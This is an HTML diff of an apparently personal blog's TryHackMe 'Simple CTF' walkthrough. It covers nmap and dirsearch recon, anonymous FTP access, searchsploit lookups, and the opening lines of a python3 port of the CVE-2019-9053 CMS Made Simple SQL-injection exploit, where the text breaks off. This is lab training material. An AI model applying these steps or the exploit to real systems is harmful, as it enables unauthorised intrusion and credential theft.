@@ -1,0 +1,386 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=application-name content><meta name=apple-mobile-web-app-status-bar-style content="#fff"><meta name=apple-mobile-web-app-title content><title>Simple CTF | TryHackMe -
+</title><link rel=alternate href=https://h4r1337.github.io/posts/simple-ctf/ hreflang=en><link rel=canonical href=https://h4r1337.github.io/posts/simple-ctf/><link rel=prev href=https://h4r1337.github.io/posts/cat-pictures/><link rel=next href=https://h4r1337.github.io/posts/ambassador/><meta name=description content="In this easy box we will exploit an unauthenticated blind SQL injection on a vulnerable instance of `CMS Made Simple` and gain credentials of an SSH user. From there we will read the root flag by privilege escalation using vim."><meta name=keywords content="THM,tryhackme,Writeup,Walkthrough,Simple CTF,CVE-2019-9053,Blind SQL injection,sql injection,Beginners,Easy,Linux,Vim"><meta property="og:url" content="https://h4r1337.github.io/posts/simple-ctf/"><meta property="og:site_name" content="h4r1337 blog | CTF writeups"><meta property="og:title" content="Simple CTF | TryHackMe"><meta property="og:description" content="In this easy box we will exploit an unauthenticated blind SQL injection on a vulnerable instance of `CMS Made Simple` and gain credentials of an SSH user. From there we will read the root flag by privilege escalation using vim."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-01-14T22:55:43+05:30"><meta property="article:modified_time" content="2023-01-14T22:55:43+05:30"><meta property="article:tag" content="TryHackMe"><meta property="article:tag" content="CVE-2019-9053"><meta property="article:tag" content="Blind SQLI"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Vim"><meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png"><meta property="og:see_also" content="https://h4r1337.github.io/posts/airplane/"><meta property="og:see_also" content="https://h4r1337.github.io/posts/cat-pictures/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png"><meta name=twitter:title content="Simple CTF | TryHackMe"><meta name=twitter:description content="In this easy box we will exploit an unauthenticated blind SQL injection on a vulnerable instance of `CMS Made Simple` and gain credentials of an SSH user. From there we will read the root flag by privilege escalation using vim."><meta name=referrer content="no-referrer-when-downgrade"><link rel=apple-touch-icon sizes=180x180 href=/favicons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicons/favicon-16x16.png><link rel=manifest href=/favicons/site.webmanifest><link rel=mask-icon href=/favicons/safari-pinned-tab.svg color=#5bbad5><meta name=apple-mobile-web-app-title content="Jekyll Klise"><meta name=application-name content="Jekyll Klise"><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#2c2c2c"><link href=https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css rel=stylesheet><link rel=stylesheet href=/sass/main.min.2480d733c3cd78de5d135eb2d8c0b0f964b2bf1e047d180f4f363bdcc3b23b20.css integrity="sha256-JIDXM8PNeN5dE16y2MCw+WSyvx4EfRgPTzY73MOyOyA="><link rel=stylesheet href=/lib/fontawesome-free/all.min.e5e202e3c899507992952533f57b634722b69b34241d271963559d31aa33ef81.css integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E="></head><body data-theme=dark class=notransition><script>const body=document.body,data=body.getAttribute("data-theme"),initTheme=e=>{e==="dark"?body.setAttribute("data-theme","dark"):e==="light"?body.removeAttribute("data-theme"):localStorage.setItem("theme",data)};initTheme(localStorage.getItem("theme")),setTimeout(()=>body.classList.remove("notransition"),75)</script><script id=partial/analytics.html data-goatcounter=https://h4r1337-blog.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class=navbar role=navigation><nav class=menu><input type=checkbox id=menu-trigger class=menu-trigger>
+<label for=menu-trigger><span class=menu-icon><svg width="24" height="24" viewBox="0 0 512 512"><path d="M64 384H448V341.33H64zm0-106.67H448V234.67H64zM64 128v42.67H448V128z"/></svg>
+</span></label><a id=mode href=#><svg class="mode-sunny" width="24" height="24" viewBox="0 0 512 512"><title>LIGHT</title><line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/></svg><svg class="mode-moon" width="24" height="24" viewBox="0 0 512 512"><title>DARK</title><line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/><circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"/></svg></a><div class=trigger><div class=trigger-container><a class=menu-link href=/ title=home>home
+</a><a class=menu-link href=/posts title=posts>posts
+</a><a class=menu-link href=/series title=series>series
+</a><a class=menu-link href=/resume.pdf title=resume>resume
+</a><a class=menu-link href=/whoami title=whoami>whoami
+</a><a class="menu-link rss" href=/index.xml><svg width="17" height="17" viewBox="0 0 512 512" fill="#ed812e"><title>RSS</title><path d="M108.56 342.78a60.34 60.34.0 1060.56 60.44 60.63 60.63.0 00-60.56-60.44z"/><path d="M48 186.67v86.55c52 0 101.94 15.39 138.67 52.11s52 86.56 52 138.67h86.66c0-151.56-125.66-277.33-277.33-277.33z"/><path d="M48 48v86.56c185.25.0 329.22 144.08 329.22 329.44H464C464 234.66 277.67 48 48 48z"/></svg></a></div></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article itemscope itemtype=https://schema.org/BlogPosting><header class=header><div class=tags><span itemprop=keywords><a href=https://h4r1337.github.io/tags/tryhackme/ class=tag>TRYHACKME</a>
+,
+<a href=https://h4r1337.github.io/tags/cve-2019-9053/ class=tag>CVE-2019-9053</a>
+,
+<a href=https://h4r1337.github.io/tags/blind-sqli/ class=tag>BLIND SQLI</a>
+,
+<a href=https://h4r1337.github.io/tags/linux/ class=tag>LINUX</a>
+,
+<a href=https://h4r1337.github.io/tags/easy/ class=tag>EASY</a>
+,
+<a href=https://h4r1337.github.io/tags/vim/ class=tag>VIM</a>
+,
+<a href=https://h4r1337.github.io/tags/ftp/ class=tag>FTP</a>
+,
+<a href=https://h4r1337.github.io/tags/cms-made-simple/ class=tag>CMS MADE SIMPLE</a></span></div><h1 class=header-title itemprop=headline>Simple CTF | TryHackMe</h1><div class=post-meta><time datetime="2023-01-14 22:55:43 +0530 +0530" itemprop=datePublished>2023-01-14
+</time><span itemprop=author itemscope itemtype=https://schema.org/Person><span itemprop=name>h4r1337</span>
+</span><time hidden datetime="2023-01-14 22:55:43 +0530 +0530" itemprop=dateModified></time>
+<span hidden itemprop=publisher itemtype=Person>h4r1337</span>
+<span hidden itemprop=mainEntityOfPage>In this easy box we will exploit an unauthenticated blind SQL injection on a vulnerable instance of `CMS Made Simple` and gain credentials of an SSH user. From there we will read the root flag by privilege escalation using vim.</span></div></header><div class=page-content itemprop=articleBody><h3 id=overview><a href=#overview class=anchor-head aria-label=Anchor></a>Overview</h3><figure><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png></figure><table><thead><tr><th style=text-align:center>Title</th><th style=text-align:center><a href=https://tryhackme.com/rooms/easyctf>Simple CTF</a></th></tr></thead><tbody><tr><td style=text-align:center>Difficulty</td><td style=text-align:center>Easy</td></tr><tr><td style=text-align:center>Machine</td><td style=text-align:center>Linux</td></tr><tr><td style=text-align:center>Description</td><td style=text-align:center>Beginner level ctf</td></tr><tr><td style=text-align:center>Maker</td><td style=text-align:center><figure><img src=https://tryhackme-badges.s3.amazonaws.com/MrSeth6797.png alt=MrSeth6797></figure></td></tr></tbody></table><p>In this easy box we will exploit an unauthenticated blind SQL injection on a vulnerable instance of <code>CMS Made Simple</code> and gain credentials of an SSH user. From there we will read the root flag by privilege escalation using vim.</p><h5 id=used-tools>Used tools</h5><ul><li>nmap</li><li>dirsearch</li><li>searchsploit</li><li><a href=https://www.exploit-db.com/exploits/46635>CVE-2019-9053</a></li></ul><h5 id=wordlists>Wordlists</h5><ul><li><a href=https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt>common.txt</a></li><li><a href=https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz>Rockyou.txt</a></li></ul><hr><h2 id=enumeration><a href=#enumeration class=anchor-head aria-label=Anchor></a>Enumeration</h2><p>First start with quick nmap port scan</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> nmap -p- -T4 --min-rate <span style=color:#d3869b>10000</span> 10.10.38.40 -vv -oA nmap/ports
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#fe8019>(</span> https://nmap.org <span style=color:#fe8019>)</span> at 2023-01-14 10:25 IST
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#fe8019>for</span> 10.10.38.40
+</span></span><span style=display:flex><span>Host is up <span style=color:#fe8019>(</span>0.47s latency<span style=color:#fe8019>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#d3869b>65532</span> filtered ports
+</span></span><span style=display:flex><span>PORT     STATE SERVICE
+</span></span><span style=display:flex><span>21/tcp   open  ftp
+</span></span><span style=display:flex><span>80/tcp   open  http
+</span></span><span style=display:flex><span>2222/tcp open  EtherNetIP-1
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#fe8019>done</span>: <span style=color:#d3869b>1</span> IP address <span style=color:#fe8019>(</span><span style=color:#d3869b>1</span> host up<span style=color:#fe8019>)</span> scanned in 213.02 seconds
+</span></span></code></pre></div><p>Now further scan only the open ports identified from above.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> nmap -p 21,80,2222 -sC -sV  10.10.38.40 -vv -oA nmap/service
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Nmap 7.80 scan initiated Sat Jan 14 10:29:32 2023 as: nmap -p 21,80,2222 -sC -sV -vv -oA nmap/service 10.10.38.40</span>
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#fe8019>for</span> 10.10.38.40
+</span></span><span style=display:flex><span>Host is up, received syn-ack <span style=color:#fe8019>(</span>0.55s latency<span style=color:#fe8019>)</span>.
+</span></span><span style=display:flex><span>Scanned at 2023-01-14 10:29:33 IST <span style=color:#fe8019>for</span> 42s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE REASON  VERSION
+</span></span><span style=display:flex><span>21/tcp   open  ftp     syn-ack vsftpd 3.0.3
+</span></span><span style=display:flex><span>| ftp-anon: Anonymous FTP login allowed <span style=color:#fe8019>(</span>FTP code 230<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>|_Cant get directory listing: TIMEOUT
+</span></span><span style=display:flex><span>| ftp-syst:
+</span></span><span style=display:flex><span>|   STAT:
+</span></span><span style=display:flex><span>| FTP server status:
+</span></span><span style=display:flex><span>|      Logged in as ftp
+</span></span><span style=display:flex><span>|      TYPE: ASCII
+</span></span><span style=display:flex><span>|      No session bandwidth limit
+</span></span><span style=display:flex><span>|      Session timeout in seconds is <span style=color:#d3869b>300</span>
+</span></span><span style=display:flex><span>|      Control connection is plain text
+</span></span><span style=display:flex><span>|      Data connections will be plain text
+</span></span><span style=display:flex><span>|      At session startup, client count was <span style=color:#d3869b>3</span>
+</span></span><span style=display:flex><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style=display:flex><span>|_End of status
+</span></span><span style=display:flex><span>80/tcp   open  http    syn-ack Apache httpd 2.4.18 <span style=color:#fe8019>((</span>Ubuntu<span style=color:#fe8019>))</span>
+</span></span><span style=display:flex><span>| http-methods:
+</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style=display:flex><span>| http-robots.txt: <span style=color:#d3869b>2</span> disallowed entries
+</span></span><span style=display:flex><span>|_/ /openemr-5_0_1_3
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.18 <span style=color:#fe8019>(</span>Ubuntu<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style=display:flex><span>2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style=color:#fe8019>(</span>Ubuntu Linux; protocol 2.0<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   <span style=color:#d3869b>2048</span> 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 <span style=color:#fe8019>(</span>RSA<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
+</span></span><span style=display:flex><span>|   <span style=color:#d3869b>256</span> 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c <span style=color:#fe8019>(</span>ECDSA<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY<span style=color:#fe8019>=</span>
+</span></span><span style=display:flex><span>|   <span style=color:#d3869b>256</span> 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 <span style=color:#fe8019>(</span>ED25519<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
+</span></span><span style=display:flex><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Nmap done at Sat Jan 14 10:30:15 2023 -- 1 IP address (1 host up) scanned in 43.25 seconds</span>
+</span></span></code></pre></div><p>3 TCP ports are open:</p><ul><li><strong>21/tcp -></strong> <code>FTP</code></li><li><strong>80/tcp -></strong> <code>HTTP</code></li><li><strong>2222/tcp -></strong> <code>SSH</code></li></ul><hr><h3 id=port-21---ftp-vsftpd-303><a href=#port-21---ftp-vsftpd-303 class=anchor-head aria-label=Anchor></a>Port 21 - FTP (vsFTPd 3.0.3)</h3><p>FTP Anonymous login is enabled and we can login using either <code>ftp</code> or <code>anonymous</code> user without any password. Inside the server there was a directory named <code>pub</code> and inside that a file, <code>ForMitch.txt</code>.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> ftp ftp@10.10.38.40
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>Connected to 10.10.38.40.
+</span></span><span style=display:flex><span><span style=color:#d3869b>220</span> <span style=color:#fe8019>(</span>vsFTPd 3.0.3<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span><span style=color:#d3869b>230</span> Login successful.
+</span></span><span style=display:flex><span>Remote system <span style=color:#fabd2f>type</span> is UNIX.
+</span></span><span style=display:flex><span>Using binary mode to transfer files.
+</span></span><span style=display:flex><span>ftp&gt; ls
+</span></span><span style=display:flex><span>drwxr-xr-x    <span style=color:#d3869b>2</span> ftp      ftp          <span style=color:#d3869b>4096</span> Aug <span style=color:#d3869b>17</span>  <span style=color:#d3869b>2019</span> pub
+</span></span><span style=display:flex><span>ftp&gt; <span style=color:#fabd2f>cd</span> pub
+</span></span><span style=display:flex><span>ftp&gt; ls
+</span></span><span style=display:flex><span>-rw-r--r--    <span style=color:#d3869b>1</span> ftp      ftp           <span style=color:#d3869b>166</span> Aug <span style=color:#d3869b>17</span>  <span style=color:#d3869b>2019</span> ForMitch.txt
+</span></span><span style=display:flex><span>ftp&gt; get ForMitch.txt
+</span></span><span style=display:flex><span>100% |*************************************************|   <span style=color:#d3869b>166</span>        3.51 MiB/s    00:00 ETA
+</span></span><span style=display:flex><span><span style=color:#d3869b>166</span> bytes received in 00:00 <span style=color:#fe8019>(</span>0.79 KiB/s<span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>ftp&gt;
+</span></span></code></pre></div><br><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> cat ForMitch.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Dammit man... you&#39;te the worst dev i&#39;ve seen. You set the same passfor the system user,
+</span></span><span style=display:flex><span>and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+</span></span></code></pre></div><h3 id=port-80---http-apache-2418-ubuntu-default><a href=#port-80---http-apache-2418-ubuntu-default class=anchor-head aria-label=Anchor></a>Port 80 - HTTP (Apache 2.4.18 Ubuntu default)</h3><p>This is just the default page of apache.</p><img src=/img/simple-ctf/apache-default.webp alt="Apache Ubuntu default" style=zgotmplz><p>Interestingly there&rsquo;s a <code>robots.txt</code> file inside
+the server.</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>User-agent: *
+</span></span><span style=display:flex><span>Disallow: /
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Disallow: /openemr-5_0_1_3 
+</span></span></code></pre></div><p>But <code>/openemr-5_0_1_2</code> is a rabbit hole. So let&rsquo;s move on.</p><img src=/img/simple-ctf/not-found.webp alt="Not found" style=zgotmplz><h3 id=directory-listing-dirsearch---commontxt><a href=#directory-listing-dirsearch---commontxt class=anchor-head aria-label=Anchor></a>Directory Listing (dirsearch - common.txt)</h3><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> dirsearch -u http://10.10.38.40/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o directory-listing
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  _|. _ _  _  _  _ _|_    v0.4.2.7
+</span></span><span style=display:flex><span> <span style=color:#fe8019>(</span>_<span style=color:#fe8019>||</span>| _<span style=color:#fe8019>)</span> <span style=color:#fe8019>(</span>/_<span style=color:#fe8019>(</span>_<span style=color:#fe8019>||</span> <span style=color:#fe8019>(</span>_| <span style=color:#fe8019>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style=color:#d3869b>25</span> | Wordlist size: <span style=color:#d3869b>4712</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Output File: /home/h4r1337/ctf/thm/simple-ctf/reports/http_10.10.38.40/__23-01-14_11-02-37.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Target: http://10.10.38.40/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>11:02:37<span style=color:#fe8019>]</span> Starting:
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>11:03:35<span style=color:#fe8019>]</span> <span style=color:#d3869b>200</span> -  929B  - /robots.txt
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>11:03:37<span style=color:#fe8019>]</span> <span style=color:#d3869b>403</span> -  299B  - /server-status
+</span></span><span style=display:flex><span><span style=color:#fe8019>[</span>11:03:38<span style=color:#fe8019>]</span> <span style=color:#d3869b>301</span> -  311B  - /simple  -&gt;  http://10.10.38.40/simple/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Task Completed
+</span></span></code></pre></div><h3 id=simple---cms-made-simple-version-228><a href=#simple---cms-made-simple-version-228 class=anchor-head aria-label=Anchor></a><code>/simple/</code> - CMS Made Simple (Version 2.2.8)</h3><p>There&rsquo;s a <strong>cms</strong> running inside the <code>/simple/</code> directory.</p><img src=/img/simple-ctf/cms-made-simple.webp alt="CMS Made Simple" style=zgotmplz><p>Searchsploit Output:</p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> searchsploit cms made simple 2.2.8
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                              |  Path
+</span></span><span style=display:flex><span>------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span>CMS Made Simple &lt; 2.2.10 - SQL Injection                    | php/webapps/46635.py
+</span></span><span style=display:flex><span>------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> searchsploit -m 46635.py
+</span></span></code></pre></div><p>Alright we got an exploit. We can save a copy of it on the current working directory
+using the <code>-m</code> flag of <code>searchsploit</code>. We will check it out later.</p><h3 id=port-2222-ssh---openssh-72p2><a href=#port-2222-ssh---openssh-72p2 class=anchor-head aria-label=Anchor></a>Port 2222 SSH - (OpenSSH 7.2p2)</h3><ul><li>Searchsploit Results:</li></ul><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> searchsploit openssh 7.2p2
+</span></span><span style=display:flex><span>------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                               |  Path
+</span></span><span style=display:flex><span>------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>OpenSSH 2.3 &lt; 7.7 - Username Enumeration                     | linux/remote/45233.py
+</span></span><span style=display:flex><span>OpenSSH 2.3 &lt; 7.7 - Username Enumeration <span style=color:#fe8019>(</span>PoC<span style=color:#fe8019>)</span>               | linux/remote/45210.py
+</span></span><span style=display:flex><span><span style=color:#b8bb26>&#39;OpenSSH 7.2p2 - Username Enumeration                        | linux/remote/40136.py&#39;</span>
+</span></span><span style=display:flex><span>OpenSSH &lt; 7.4 - UsePrivilegeSeparation Disabled Forwarded    | linux/local/40962.txt
+</span></span><span style=display:flex><span>OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading     | linux/remote/40963.txt
+</span></span><span style=display:flex><span>OpenSSH &lt; 7.7 - User Enumeration <span style=color:#fe8019>(</span>2<span style=color:#fe8019>)</span>                         | linux/remote/45939.py
+</span></span><span style=display:flex><span><span style=color:#b8bb26>&#39;OpenSSHd 7.2p2 - Username Enumeration                       | linux/remote/40113.txt&#39;</span>
+</span></span><span style=display:flex><span>------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results
+</span></span></code></pre></div><p>Nothing interesting in here. Username probably is <code>mitch</code> from the <code>ForMitch.txt</code> file.
+So we don&rsquo;t have to use these exploits.</p><hr><h2 id=exploitation><a href=#exploitation class=anchor-head aria-label=Anchor></a>Exploitation</h2><h3 id=unauthenticated-sql-injection--cve-2019-9053-cms-made-simple><a href=#unauthenticated-sql-injection--cve-2019-9053-cms-made-simple class=anchor-head aria-label=Anchor></a>Unauthenticated SQL Injection ( CVE-2019-9053 CMS Made Simple)</h3><blockquote><p>An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the <code>m1_idlist</code> parameter.</p></blockquote><p>Exploit used (modified a bit to support python3):
+You can download the original from <a href=https://www.exploit-db.com/exploits/46635>here</a></p><div class=highlight><pre tabindex=0 style=color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#928374;font-style:italic>#!/usr/bin/python3</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Exploit Title: Unauthenticated SQL Injection on CMS Made Simple &lt;= 2.2.9</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Date: 30-03-2019</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Exploit Author: Daniele Scanu @ Certimeter Group</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Vendor Homepage: https://www.cmsmadesimple.org/</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Software Link: https://www.cmsmadesimple.org/downloads/cmsms/</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Version: &lt;= 2.2.9</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># Tested on: Ubuntu 18.04 LTS</span>
+</span></span><span style=display:flex><span><span style=color:#928374;font-style:italic># CVE : CVE-2019-9053</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#fe8019>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#fe8019>import</span> time
+</span></span><span style=display:flex><span><span style=color:#fe8019>import</span> optparse
+</span></span><span style=display:flex><span><span style=color:#fe8019>import</span> hashlib
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>parser <span style=color:#fe8019>=</span> optparse<span style=color:#fe8019>.</span>OptionParser()
+</span></span><span style=display:flex><span>parser<span style=color:#fe8019>.</span>add_option(<span style=color:#b8bb26>&#39;-u&#39;</span>, <span style=color:#b8bb26>&#39;--url&#39;</span>, action<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;store&#34;</span>, dest<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;url&#34;</span>, help<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;Base target uri (ex. http://10.10.10.100/cms)&#34;</span>)
+</span></span><span style=display:flex><span>parser<span style=color:#fe8019>.</span>add_option(<span style=color:#b8bb26>&#39;-w&#39;</span>, <span style=color:#b8bb26>&#39;--wordlist&#39;</span>, action<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;store&#34;</span>, dest<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;wordlist&#34;</span>, help<span style=color:#fe8019>=</span><span style=color:#b8bb26>&#34;Wordlist for crack admin password&#34;</span>)
